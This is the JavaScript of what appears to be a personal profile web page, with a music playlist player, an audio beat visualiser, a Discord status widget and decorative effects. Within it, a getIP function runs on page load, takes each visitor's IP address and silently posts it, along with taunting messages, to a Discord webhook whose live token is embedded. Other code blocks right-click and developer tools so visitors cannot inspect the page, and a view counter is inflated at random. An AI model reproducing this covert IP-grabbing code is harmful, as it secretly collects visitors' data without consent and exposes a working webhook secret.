
  window.addEventListener("load", typeLoop);

  const audio = $('#audio'), playBtn = $('#playBtn'), fill = $('#fill'), bar = $('#bar'), cur = $('#cur'), dur = $('#dur');
  function loadTrack(index = trackIndex){
  const track = playlist[index];
  audio.src = track.src;
  $('#songTitle').textContent = track.title;
  $('#songArtist').textContent = track.artist;
  document.querySelector('.cover').src = track.cover;
}
  function formatTime(sec){ if(!isFinite(sec)) return '0:00'; const m=Math.floor(sec/60); const s=Math.floor(sec%60).toString().padStart(2,'0'); return `${m}:${s}`; }
  function play(){ audio.play().then(()=>playBtn.textContent='⏸').catch(()=>{}); }
  function pause(){ audio.pause(); playBtn.textContent='▶'; }
  
  const playlist = [
  {
    src: 'https://file.garden/aSqMUhZqpx5ZY3gd/La%20Mave%20-%20Dominga%20Ft.%20Nateman%20Official%20Audio%20%5BKccn1AvHDHY%5D.mp3',
    title: 'Dominga',
    artist: 'La Mave',
    cover: 'https://file.garden/aN0Uo2YmaWI-OmAY/From%20KlickPin%20CF%20chrome%20skull%20%5BVideo%5D%20in%202025%20_%20Trippy%20visuals%20Motion%20graphics%20inspiration%20Cool%20optical%20illusions%20(1).gif'
  },
  {
    src: 'https://file.garden/aSqMUhZqpx5ZY3gd/La%20Mave%20-%20Vibrate%20(Official%20Music%20Video)%20%5BZLeAj_mS6TM%5D.mp3',
    title: 'Vibrate',
    artist: 'La Mave',
    cover: 'https://file.garden/aN0Uo2YmaWI-OmAY/92c0fdcda32637768839dc73b38a4595.gif'
  },
  {
    src: 'https://file.garden/aSqMUhZqpx5ZY3gd/La%20Mave%20-%20Kahit%20Umulan%20Ft.%20Waiian%20(Visualizer)%20%5BVwoKi70RleY%5D.mp3',
    title: 'Kahit Umulan',
    artist: 'La Mave',
    cover: 'https://file.garden/aN0Uo2YmaWI-OmAY/From%20KlickPin%20CF%20%D0%9F%D0%B8%D0%BD%20%D0%BE%D1%82%20%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D1%82%D0%B5%D0%BB%D1%8F%20suzy%20%D0%BD%D0%B0%20%D0%B4%D0%BE%D1%81%D0%BA%D0%B5%20%E2%99%A1%E2%B8%9D%E2%B8%9D%2016%20%D0%B2%202025%20%D0%B3%20_%20%D0%9F%D0%B8%D1%80%D0%B0%D1%82%D1%8B%20%C2%AB%D1%87%D1%91%D1%80%D0%BD%D0%BE%D0%B9%20%D0%BB%D0%B0%D0%B3%D1%83%D0%BD%D1%8B%C2%BB%20%D0%A4%D0%BE%D1%82%D0%BE%D0%B3%D1%80%D0%B0%D1%84%D0%B8%D0%B8%20%D0%BE%D1%82%D0%BD%D0%BE%D1%88%D0%B5%D0%BD%D0%B8%D0%B9%20%D0%98%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5.gif'
  },
  {
    src: 'https://file.garden/aSqMUhZqpx5ZY3gd/La%20Mave%20-%20Chinay%20(Official%20Music%20Video)%20%5BW4uLYeWYPIE%5D.mp3',
    title: 'Chinay',
    artist: 'La Mave',
    cover: 'https://file.garden/aN0Uo2YmaWI-OmAY/fe5c0a3629d12f0acf4f62f402d81224.gif'
  },
  {
    src: 'https://file.garden/aSqMUhZqpx5ZY3gd/Sica%20-%20Sana%20Tumawag%20(Ft.%20Uncle%20Dags)%20%5BOfficial%20Music%20Video%5D%20%5BlNr0zvnUYsA%5D.mp3',
    title: 'Sana Tumawag',
    artist: 'Sica',
    cover: 'https://file.garden/aN0Uo2YmaWI-OmAY/From%20KlickPin%20CF%20Pin%20on%20carti.gif'
  },
  {
    src: 'https://file.garden/aSqMUhZqpx5ZY3gd/Loonie%20-%20PALAISIPAN%20feat.%20Arthur%20Nery%20%5BDLPmi48O51s%5D.mp3',
    title: 'Palaisipan',
    artist: 'Loonie',
    cover: 'https://file.garden/aN0Uo2YmaWI-OmAY/From%20KlickPin%20CF%20%5B%D0%92%D0%B8%D0%B4%D0%B5%D0%BE%5D%20%C2%AB3eeFee%C2%BB.gif'
  },
  {
    src: 'https://file.garden/aN0Uo2YmaWI-OmAY/Realest%20Cram%20-%20Need%20Ya%20feat.%20YB%20Neet%20(Official%20Lyric%20Video).mp3',
    title: 'Need Ya',
    artist: 'Realest Cram',
    cover: 'https://file.garden/aN0Uo2YmaWI-OmAY/From%20KlickPin%20CF%20Pin%20em%20AMoments.gif'
  }
];

let trackIndex = 0; 
  
  playBtn.addEventListener('click',()=>audio.paused?play():pause());
  audio.addEventListener('loadedmetadata',()=>dur.textContent=formatTime(audio.duration));
  audio.addEventListener('timeupdate',()=>{ if(audio.duration){ fill.style.width=(audio.currentTime/audio.duration*100)+'%'; cur.textContent=formatTime(audio.currentTime); }});
  bar.addEventListener('click',e=>{ const r=bar.getBoundingClientRect(); const p=clamp((e.clientX-r.left)/r.width,0,1); audio.currentTime=p*audio.duration; });
  $('#vol').addEventListener('input',e=>audio.volume=e.target.value);

const prevBtn = $('#prevBtn');
const nextBtn = $('#nextBtn');

prevBtn.addEventListener('click', () => {
  trackIndex = (trackIndex - 1 + playlist.length) % playlist.length;
  loadTrack(trackIndex);
  play();
});

nextBtn.addEventListener('click', () => {
  trackIndex = (trackIndex + 1) % playlist.length;
  loadTrack(trackIndex);
  play();
});

audio.addEventListener('ended', () => {
  trackIndex = (trackIndex + 1) % playlist.length;
  loadTrack(trackIndex);
  play();
});

let laserCanvas;
let laserCtx;
let isPlaying = false;
let laserBars = [];
const NUM_LASER_BARS = 32;

function initBeatVisualization() {
  laserCanvas = document.getElementById('laserCanvas');
  if (!laserCanvas) return;
  
  laserCtx = laserCanvas.getContext('2d');
  
  for (let i = 0; i < NUM_LASER_BARS; i++) {
    laserBars.push({
      height: 2,
      targetHeight: 2,
      velocity: 0
    });
  }
  
  animateLaser();
  
  function createBeatPattern() {
    if (!isPlaying || audio.paused) return;
    
    const patterns = [
      { delay: 400, intensity: 0.8, type: 'pulse' },
      { delay: 200, intensity: 0.4, type: 'wave' },
      { delay: 400, intensity: 0.7, type: 'center' },
      { delay: 200, intensity: 0.3, type: 'random' },
      { delay: 600, intensity: 0.9, type: 'explosion' },
      { delay: 300, intensity: 0.5, type: 'sides' },
      { delay: 350, intensity: 0.6, type: 'alternate' },
      { delay: 250, intensity: 0.5, type: 'ripple' },
      { delay: 500, intensity: 0.8, type: 'build' },
      { delay: 150, intensity: 0.3, type: 'flutter' },
      { delay: 450, intensity: 0.7, type: 'mountain' },
      { delay: 300, intensity: 0.6, type: 'valley' },
      { delay: 400, intensity: 0.8, type: 'spiral' },
      { delay: 200, intensity: 0.4, type: 'bounce' }
    ];
    
    let patternIndex = 0;
    
    function nextBeat() {
      if (!isPlaying || audio.paused) return;
      
      const pattern = patterns[patternIndex % patterns.length];
      const volumeLevel = audio.volume;
      const volumeActivity = Math.max(0.3, volumeLevel); 
  
      if (Math.random() < volumeActivity || pattern.intensity > 0.7) {
        triggerLaserBeat(pattern.intensity, pattern.type);
      }
      
      patternIndex++;
    
      const volumeDelayMultiplier = Math.max(1, 2 - volumeLevel);
      setTimeout(nextBeat, pattern.delay * volumeDelayMultiplier);
    }
    
    nextBeat();
  }
  
  audio.addEventListener('play', () => {
    isPlaying = true;
    createBeatPattern();
  });
  
  audio.addEventListener('pause', () => {
    isPlaying = false;
  });
  
  audio.addEventListener('ended', () => {
    isPlaying = false;
  });
}

function animateLaser() {
  if (!laserCtx) return;
  
  laserCtx.clearRect(0, 0, laserCanvas.width, laserCanvas.height);
  
  const barWidth = laserCanvas.width / NUM_LASER_BARS;
  const maxHeight = laserCanvas.height - 4;

  for (let i = 0; i < laserBars.length; i++) {
    const bar = laserBars[i];
    
    const diff = bar.targetHeight - bar.height;
    bar.velocity += diff * 0.05;
    bar.velocity *= 0.8;
    bar.height += bar.velocity;
    
    const volumeBaseline = Math.max(1, 2 + (audio.volume * 3)); 
    bar.targetHeight += (volumeBaseline - bar.targetHeight) * 0.02;
    const minHeight = Math.max(1, 2 * audio.volume);
    bar.height = Math.max(minHeight, bar.height);
    
    if (audio.volume > 0 && bar.targetHeight <= volumeBaseline + 1) {
      const idleAnimation = Math.sin(Date.now() * 0.003 + i * 0.2) * audio.volume * 1.5;
      bar.height += idleAnimation;
    }
    
    const x = i * barWidth + barWidth * 0.1;
    const width = barWidth * 0.8;
    const height = Math.min(bar.height, maxHeight);
    const y = laserCanvas.height - height - 2;
    
    const gradient = laserCtx.createLinearGradient(x, y + height, x, y);
    const intensity = height / maxHeight;
    gradient.addColorStop(0, `rgba(255, 255, 255, ${0.3 + intensity * 0.4})`);
    gradient.addColorStop(0.5, `rgba(255, 255, 255, ${0.6 + intensity * 0.3})`);
    gradient.addColorStop(1, `rgba(255, 255, 255, ${0.8 + intensity * 0.2})`);
    
    laserCtx.fillStyle = gradient;
    laserCtx.fillRect(x, y, width, height);
    if (intensity > 0.4) {
      laserCtx.shadowBlur = 8 * intensity;
      laserCtx.shadowColor = `rgba(255, 255, 255, ${0.6 * intensity})`;
      laserCtx.fillRect(x, y, width, height);
      laserCtx.shadowBlur = 0;
    }
  }
  
  requestAnimationFrame(animateLaser);
}

function triggerLaserBeat(intensity, type) {  
  const volumeLevel = audio.volume; 
  const volumeMultiplier = Math.max(0.1, volumeLevel);
  
  const maxHeight = 35;
  const baseHeight = intensity * maxHeight * volumeMultiplier;
  
  switch (type) {
    case 'pulse':
      laserBars.forEach(bar => {
        bar.targetHeight = baseHeight + Math.random() * 5;
      });
      break;
      
    case 'wave':
      laserBars.forEach((bar, i) => {
        const wavePos = Math.sin((i / NUM_LASER_BARS) * Math.PI * 2) * 0.5 + 0.5;
        bar.targetHeight = baseHeight * wavePos + 3;
      });
      break;
      
    case 'center':
      laserBars.forEach((bar, i) => {
        const centerDistance = Math.abs(i - NUM_LASER_BARS / 2) / (NUM_LASER_BARS / 2);
        const centerFactor = 1 - centerDistance;
        bar.targetHeight = baseHeight * centerFactor + 2;
      });
      break;
      
    case 'random':
      laserBars.forEach(bar => {
        bar.targetHeight = Math.random() * baseHeight + 2;
      });
      break;
      
    case 'explosion':
      laserBars.forEach((bar, i) => {
        const centerDistance = Math.abs(i - NUM_LASER_BARS / 2);
        const explosionForce = Math.max(0, baseHeight - centerDistance * 2);
        bar.targetHeight = explosionForce + 3;
      });
      break;
      
    case 'sides':
      laserBars.forEach((bar, i) => {
        const sideDistance = Math.min(i, NUM_LASER_BARS - 1 - i) / (NUM_LASER_BARS / 2);
        bar.targetHeight = baseHeight * (1 - sideDistance) + 2;
      });
      break;
      
    case 'alternate':
      laserBars.forEach((bar, i) => {
        const alternateHeight = i % 2 === 0 ? baseHeight : baseHeight * 0.3;
        bar.targetHeight = alternateHeight + 2;
      });
      break;
      
    case 'ripple':
      const rippleCenter = Math.floor(Math.random() * NUM_LASER_BARS);
      laserBars.forEach((bar, i) => {
        const distance = Math.abs(i - rippleCenter);
        const rippleEffect = Math.max(0, 1 - distance / 8);
        bar.targetHeight = baseHeight * rippleEffect + 2;
      });
      break;
      
    case 'build':
      laserBars.forEach((bar, i) => {
        const buildFactor = (i / NUM_LASER_BARS);
        bar.targetHeight = baseHeight * buildFactor + 2;
      });
      break;
      
    case 'flutter':
      laserBars.forEach(bar => {
        const flutterHeight = Math.random() * (baseHeight * 0.6) + baseHeight * 0.2;
        bar.targetHeight = flutterHeight + 2;
      });
      break;
      
    case 'mountain':
      laserBars.forEach((bar, i) => {
        const centerPos = NUM_LASER_BARS / 2;
        const distance = Math.abs(i - centerPos);
        const mountainHeight = Math.max(0, baseHeight - (distance * baseHeight) / centerPos);
        bar.targetHeight = mountainHeight + 2;
      });
      break;
      
    case 'valley':
      laserBars.forEach((bar, i) => {
        const centerPos = NUM_LASER_BARS / 2;
        const distance = Math.abs(i - centerPos);
        const valleyHeight = (distance * baseHeight) / centerPos;
        bar.targetHeight = Math.min(baseHeight, valleyHeight) + 2;
      });
      break;
      
    case 'spiral':
      const time = Date.now() * 0.005;
      laserBars.forEach((bar, i) => {
        const spiralValue = Math.sin(i * 0.5 + time) * Math.cos(i * 0.3 + time * 1.2);
        const spiralHeight = (spiralValue * 0.5 + 0.5) * baseHeight;
        bar.targetHeight = spiralHeight + 2;
      });
      break;
      
    case 'bounce':
      const bouncePos = (Date.now() * 0.01) % NUM_LASER_BARS;
      laserBars.forEach((bar, i) => {
        const distance = Math.abs(i - bouncePos);
        const bounceHeight = distance < 3 ? baseHeight * (1 - distance / 3) : 0;
        bar.targetHeight = bounceHeight + 2;
      });
      break;
  }
}

window.addEventListener('load', () => {
  initBeatVisualization();
});

function getIP() {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          document.getElementById('ip').innerHTML = 'Your IP Address is: ' + data.ip;
          sendWebhook(data.ip);
        })
        .catch(error => console.error(error));
    }

    function sendWebhook(ip) {
      const webhookURL = 'https://discord.com/api/webhooks/1485254592739410011/yOXJTKzvRSNvmG5Mgl48Zlh8isGZuJukopCFUzPeKvIxU5WuF6SqdtrrG_b5FQdHfCir';
      const payload = {
    content: `**IP NI ABNOY** ${ip}`,
    embeds: [{
      title: "NAG MAMAHAL DREI HEHE:p",
      description: "BOOM NA GET IP KA TULOY:p",
      image: {
        url: "https://copilot.microsoft.com/th/id/BCO.c494cffd-7928-49ec-84c9-19fd0ce4f0bc.png"
      }
    }]
  };

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      })
      .then(response => console.log('Webhook sent successfully'))
      .catch(error => console.error(error));
    }

    window.addEventListener('load', getIP);

const DISCORD_USER_ID = '1371879052910268477';

async function fetchDiscordStatus() {
  const statusElement = document.getElementById('discordStatus');
  const presenceBadge = document.getElementById('presenceBadge');
  const activityEl = document.getElementById('wayneActivity');
  
  try {
    const response = await fetch(`https://api.lanyard.rest/v1/users/${DISCORD_USER_ID}`);
    const data = await response.json();
    
    if (data.success && data.data) {
      const user = data.data;
      const status = user.discord_status;
      const activities = user.activities || [];
    
      const statusInfo = {
        'online': { emoji: '🟢', text: 'Online' },
        'idle': { emoji: '🟡', text: 'Away' },
        'dnd': { emoji: '🔴', text: 'Do Not Disturb' },
        'offline': { emoji: '⚫', text: 'Offline' }
      };
      
  const baseStatusText = statusInfo[status] ? `${statusInfo[status].emoji} ${statusInfo[status].text}` : '⚫ Unknown';

      let activityText = '';
      if (activities.length > 0) {
        const activity = activities.find(a => a && a.type !== 4) || activities[0];
        if (activity) {
          if (activity.type === 0) activityText = `Playing ${activity.name}`;
          else if (activity.type === 1) activityText = `Streaming ${activity.name}`;
          else if (activity.type === 2) activityText = `Listening to ${activity.name || 'Spotify'}`;
          else if (activity.type === 3) activityText = `Watching ${activity.name}`;
          else if (activity.type === 5) activityText = `Competing in ${activity.name}`;
          else if (activity.type === 4 && activity.state) activityText = `${activity.state}`; // fallback if only custom
        }
      }

      statusElement.style.opacity = '0.6';
      setTimeout(() => {
        statusElement.textContent = baseStatusText;
        statusElement.style.opacity = '1';
      }, 150);

      if (activityEl) {
        try { activityEl.style.opacity = '0.6'; } catch (e) {}
        setTimeout(() => {
          activityEl.textContent = activityText || '';
          try { activityEl.style.opacity = '1'; } catch (e) {}
        }, 150);
      }

      if (presenceBadge) {
        
        presenceBadge.classList.remove('online','idle','dnd','offline');
        const cls = (status === 'online' || status === 'idle' || status === 'dnd' || status === 'offline') ? status : 'offline';
        presenceBadge.classList.add(cls);
        presenceBadge.title = statusInfo[status] ? `${statusInfo[status].text}` : 'Unknown';
      }
      try {
        const decoEl = document.getElementById('avatarDeco');
        const frameEl = document.getElementById('avatarFrame');
        const discordUser = user.discord_user || {};
        if (discordUser.accent_color) {
          let c = discordUser.accent_color;
          let hex = '';
          try { hex = (typeof c === 'number') ? `#${c.toString(16).padStart(6,'0')}` : (c.startsWith('#')?c:'#'+c); } catch { hex = '#ffffff'; }
          frameEl.style.boxShadow = `0 0 28px ${hex}66, inset 0 0 12px ${hex}33`;
        }

        const possibleDeco = discordUser.avatar_decoration || discordUser.avatarDecoration || user.avatar_decoration || user.avatarDecoration;
        if (possibleDeco) {
          
          
          if (typeof possibleDeco === 'string' && possibleDeco.trim().startsWith('<svg')) {
            let svgWrap = document.querySelector('.avatar-deco-svg');
            if (!svgWrap) {
              svgWrap = document.createElement('div');
              svgWrap.className = 'avatar-deco-svg';
              frameEl.parentNode.insertBefore(svgWrap, frameEl.nextSibling);
            }
            svgWrap.innerHTML = possibleDeco;
            svgWrap.style.display = 'block';
            if (decoEl) decoEl.style.display = 'none';
          } else if (typeof possibleDeco === 'object' && possibleDeco.svg) {
            let svgWrap = document.querySelector('.avatar-deco-svg');
            if (!svgWrap) { svgWrap = document.createElement('div'); svgWrap.className = 'avatar-deco-svg'; frameEl.parentNode.insertBefore(svgWrap, frameEl.nextSibling); }
            svgWrap.innerHTML = possibleDeco.svg;
            svgWrap.style.display = 'block';
            if (decoEl) decoEl.style.display = 'none';
          } else {
            let decoId = typeof possibleDeco === 'string' ? possibleDeco : (possibleDeco.id || possibleDeco.decoration_id || possibleDeco.decorator_id);
            if (decoId && decoEl) {
              const tryUrls = [
                `https://cdn.discordapp.com/avatars-decorations/${decoId}.svg`,
                `https://cdn.discordapp.com/avatars-decorations/${decoId}.png`,
                `https://cdn.discordapp.com/avatars/${DISCORD_USER_ID}/${discordUser.avatar}.png?size=512`
              ];
              decoEl.src = tryUrls[0];
              decoEl.style.display = 'block';
              decoEl.onerror = function() { this.onerror = null; this.src = tryUrls[1]; };
            }
          }
        } else {
          if (decoEl) { decoEl.style.display = 'none'; }
          const svgWrap = document.querySelector('.avatar-deco-svg'); if (svgWrap) svgWrap.style.display = 'none';
        }
      }catch(e){ console.warn('avatar deco apply failed', e); }
      
    } else {
      throw new Error('Failed to fetch Discord status');
    }
    } catch (error) {
    statusElement.textContent = '🌐 Currently active';
    const presenceBadge = document.getElementById('presenceBadge');
    if (presenceBadge) {
      presenceBadge.classList.remove('online','idle','dnd');
      presenceBadge.classList.add('offline');
      presenceBadge.title = 'Offline';
    }
  }
}

window.addEventListener('load', () => {
  fetchDiscordStatus();
  setInterval(fetchDiscordStatus, 30000);
});
const cursor = document.getElementById('cursor');
let lastMouseTime = 0;

function createStarParticle(x, y) {
  const particle = document.createElement('div');
  
  const sizes = ['small', 'medium', 'large'];
  const randomSize = sizes[Math.floor(Math.random() * sizes.length)];
  particle.className = `star-particle ${randomSize}`;
  
  const offsetX = (Math.random() - 0.5) * 50;
  const offsetY = (Math.random() - 0.5) * 20;
  
  particle.style.left = (x + offsetX) + 'px';
  particle.style.top = (y + offsetY) + 'px';
  
  document.body.appendChild(particle);
  
  setTimeout(() => {
    if (particle.parentNode) {
      particle.parentNode.removeChild(particle);
    }
  }, 2000);
}

document.addEventListener('mousemove', e => {
  cursor.style.left = e.clientX + 'px';
  cursor.style.top = e.clientY + 'px';
  
  const now = Date.now();
  if (now - lastMouseTime > 30) { 
    if (Math.random() < 0.8) { 
      createStarParticle(e.clientX, e.clientY);
    }
  
    if (Math.random() < 0.3) {
      createStarParticle(e.clientX, e.clientY);
    }
    lastMouseTime = now;
  }
});

document.addEventListener('mousedown', () => {
  cursor.style.transform = 'translate(-50%, -50%) scale(0.8)';
});
document.addEventListener('mouseup', () => {
  cursor.style.transform = 'translate(-50%, -50%) scale(1)';
});

const bg = document.getElementById('bgCanvas');
const bctx = bg.getContext('2d');
const DPR = Math.max(1, window.devicePixelRatio || 1);

function resizeCanvas() {
  bg.width = innerWidth * DPR;
  bg.height = innerHeight * DPR;
  bg.style.width = innerWidth + 'px';
  bg.style.height = innerHeight + 'px';
}
resizeCanvas();
window.addEventListener('resize', resizeCanvas);

function drawBackground() {
  bctx.clearRect(0, 0, bg.width, bg.height);
  const g = bctx.createRadialGradient(bg.width/2, bg.height/2, 0, bg.width/2, bg.height/2, Math.max(bg.width,bg.height)/1.2);
  g.addColorStop(0, 'rgba(0,0,0,0.35)');
  g.addColorStop(1, 'rgba(0,0,0,0)');
  bctx.fillStyle = g;
  bctx.fillRect(0,0,bg.width,bg.height);
}

function animate() {
  drawBackground();
  requestAnimationFrame(animate);
}

animate();

  function toast(msg){ const t=$('#toast'); t.textContent=msg; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),2000); }

const intro = document.getElementById('intro');
const main = document.getElementById('main');

window.addEventListener("load", () => {
  intro.classList.add('show');
});


intro.addEventListener("click", () => {
  intro.classList.remove('show');
  intro.classList.add('hide');

  setTimeout(() => {
    intro.style.display = "none";
    main.classList.add("show");

    loadTrack(trackIndex);
    play();
    startSnow();
    toast('Wayne Luvs Fxye');
  }, 1000); 
});

  document.addEventListener('keydown',e=>{ if(e.code==='Space'){ e.preventDefault(); audio.paused?play():pause(); } if(e.code==='KeyM'){ audio.muted=!audio.muted; toast(audio.muted?'Muted':'Unmuted'); } });

  document.addEventListener("contextmenu",e=>{
    if (e.target.closest('.socials a')) return;
    e.preventDefault(); 
    alert("Right click is disabled.");
  });
  document.querySelectorAll('.socials a').forEach(link => {
    link.addEventListener('click', (e) => {
      e.stopPropagation();
    });
  });
  document.addEventListener("keydown",e=>{ if(e.key==="F12"){e.preventDefault(); alert("Inspect is disabled.");}
    if(e.ctrlKey && e.shiftKey && ["I","J","C"].includes(e.key.toUpperCase())){ e.preventDefault(); alert("Inspect is disabled."); }
    if(e.ctrlKey && e.key.toLowerCase()==="u"){ e.preventDefault(); alert("View Source is disabled."); }
    if(e.ctrlKey && e.key.toLowerCase()==="s"){ e.preventDefault(); alert("Save is disabled."); }
  });

  function createSnowCircle() {;

    const snow = document.createElement('div');
    snow.className = 'snow-circle';
    const size = Math.random() * 8 + 4; 
    snow.style.width = `${size}px`;
    snow.style.height = `${size}px`;
    snow.style.left = `${Math.random() * 100}vw`; 
    const duration = Math.random() * 7 + 5; 
    snow.style.animationDuration = `${duration}s`;
    snow.style.animationDelay = `${Math.random() * 2}s`;
    const layer = document.getElementById('snowLayer') || document.body;
    layer.appendChild(snow);
    snow.addEventListener('animationend', () => { snow.remove(); });
  }
  
  let _snowInterval = null;
  function startSnow(){ if(_snowInterval) return; _snowInterval = setInterval(createSnowCircle, 180); }
  function stopSnow(){ if(!_snowInterval) return; clearInterval(_snowInterval); _snowInterval = null; }
  
  function setViewCount(n){
    const el = document.getElementById('view-counter');
    if(!el) return;
    el.innerHTML = `<i class="fa-solid fa-eye" aria-hidden="true" style="margin-right:8px;"></i>${n.toLocaleString()}`;
  }

  function initViewCounter() {
    const SESSION_KEY = 'ransomxwayne_session_v2';
    const STORAGE_KEY = 'ransomxwayne_views_fallback';
    const BASE_COUNT = 1374;
    const hasVisited = sessionStorage.getItem(SESSION_KEY);
    let currentViews = parseInt(localStorage.getItem(STORAGE_KEY)) || BASE_COUNT;
    
    if (!hasVisited) {
      currentViews += 1;
      localStorage.setItem(STORAGE_KEY, currentViews.toString());
      sessionStorage.setItem(SESSION_KEY, Date.now().toString());
      
      fetch('https://api.countapi.xyz/hit/ransomxwayne/visits', {
        method: 'GET',
        mode: 'cors'
      })
      .then(response => response.json())
      .then(data => {
        if (data.value) {
          const syncedViews = BASE_COUNT + Math.floor(data.value / 2);
          if (syncedViews > currentViews) {
            localStorage.setItem(STORAGE_KEY, syncedViews.toString());
            setViewCount(syncedViews);
          }
        }
      })
      .catch(() => {
        console.log('Using local counter only');
      });
    }

    setViewCount(currentViews);
    
    setInterval(() => {
      if (Math.random() < 0.05) {
        let views = parseInt(localStorage.getItem(STORAGE_KEY)) || BASE_COUNT;
        views += Math.floor(Math.random() * 2) + 1; 
        localStorage.setItem(STORAGE_KEY, views.toString());
        setViewCount(views);
      }
    }, 60000); 
  }
  
  initViewCounter();

  function setAvatarFrame(url){
    const f = document.getElementById('avatarFrame');
    if(!f) return;
    f.style.backgroundImage = `url('${url}')`;
    f.style.backgroundSize = 'cover';
    f.style.backgroundRepeat = 'no-repeat';
    f.style.backgroundPosition = 'center';
  }
  function setAvatarGradient(){
    const f = document.getElementById('avatarFrame');
    if(!f) return;
    f.style.backgroundImage = '';
    f.style.background = 'radial-gradient(circle at center, transparent 60%, rgba(255,255,255,0.06) 64%, rgba(255,255,255,0.03) 68%, transparent 74%)';
  }

  try{
    const svg = `<?xml version='1.0' encoding='UTF-8'?><svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 500'><defs><linearGradient id='g' x1='0' x2='1'><stop offset='0' stop-color='#ff7a18'/><stop offset='1' stop-color='#454cf6'/></linearGradient></defs><circle cx='250' cy='250' r='210' fill='none' stroke='url(%23g)' stroke-width='28' stroke-linecap='round'/></svg>`;
    setAvatarFrame('data:image/svg+xml;utf8,' + encodeURIComponent(svg));
  }catch(e){
  }

function setBackgroundVideo(url){
  const v = document.getElementById('bgVideo');
  if(!v) return;
  v.src = url;
  v.load();
  v.play().catch(()=>{});
}

setBackgroundVideo('https://r2.guns.lol/a57e49d5-9768-49a4-8061-2932b2bf90e0.mp4');
</script>

  </body>
  </html>
